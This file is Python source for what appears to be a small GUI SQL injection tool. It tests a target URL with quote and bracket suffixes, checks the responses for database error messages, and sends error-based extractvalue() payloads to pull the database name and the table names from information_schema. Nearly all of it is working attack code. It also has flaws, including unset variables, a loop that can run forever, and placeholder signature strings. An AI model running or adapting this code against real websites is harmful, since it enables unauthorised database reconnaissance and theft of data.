from tkinter import *
from tkinter import ttk
import requests
from bs4 import BeautifulSoup as BS
from tkinter import messagebox as msg


def Main(test, get_database_type, dbname, tablenames):
    if test:
        urls = [test + "'", test + '"', test[:-4] + ';', test + ")", test + "')",
                test + '")', test + '*']
        vulnerable_text = ['MySQL Query fail:', '/www/htdocs/', 'Query failed', 'mysqli_fetch_array()', 'mysqli_result',
                           'Warning: ', 'MySQL server', 'SQL syntax', 'You have an error in your SQL syntax;',
                           'mssql_query()', "Incorrect s>"]
        try:
            for url in urls:
                results = requests.get(url)
                data = results.text
                soup = BS(data, features='html.parser')
                for vuln in vulnerable_text:
                    if vuln in data:
                        string = vuln
                        vulnerable = True
            if vulnerable:
                vulnerable = "Vulnerable"
        except:
            vulnerable = 'Site not Vulnerable !'
       
        if tablenames:
            print("Extracting tables names...")
            link = str(
                tablenames) + " and extractvalue(1,(select%20group_concat(table_name) from%20information_schema.tables where table_schema=database()))"
            results = requests.get(link)
            data = results.text
            str_num = str(data).find('error: ')
            str1_num = data[str_num:]
            str1 = str1_num[8:]
            str2 = str1.find('\'')
            str3 = str1[:str2]
            tables = str3
        if dbname:
            link = dbname + " and extractvalue(1,concat(1,(select database()))) --"  # " and extractvalue(0x0a,concat(0x0a,(select database())))--"
            print(link)
            results = requests.get(link)
            data = results.text
            str_num = str(data).find('error:')
            print(str_num)
            str1_num = data[str_num:]
            str1 = str1_num[8:]
            str2 = str1.find('\'')
            str3 = str1[:str2]
            if str_num == -1:
                DBname = 'Access Denied'
            else:
                DBname = str3
        if get_database_type:
            print("hello")
            urls = [get_database_type + "'", get_database_type + '"', get_database_type[:-4] + ';',
                    get_database_type + ")", get_database_type + "')", get_database_type + '")',
                    get_database_type + '*']
            DBDict = {
                "MySQL": ['MySQL', 'MySQL Query fail:', 'SQL syntax', 'You have an error in your SQL syntax',
                          'mssql_query()', 'mssql_num_rows()'],
                "PostGre": ['dafafdfds'],
                "Microsoft_SQL": ['dafafdfds'],
                "Oracle": ['dafafdfds'],
                "Advantage_Database": ['dafafdfds'],
                "Firebird": ['dafafdfds']
            }
            DBFound = 0
            DBType = ''
            try:
                for url in urls:
                    results = requests.get(url)
                    data = results.text
                    soup = BS(data, features='html.parser')
                    print("reached")
                    while not DBFound:
                        for db, identifiers in DBDict.items():
                            for dbid in identifiers:
                                if dbid in data:
                                    DBType = db
                                    DBFound = 1
                                    print("reached2")
                                    break
            except:
                DBType = 'Unknown'
        else:
            msg.showerror("Empty", "Please Enter a URL!")
    if vulnerable:
        return DBType, DBname, tables, vulnerable
    else:
        return None, None, None, vulnerable
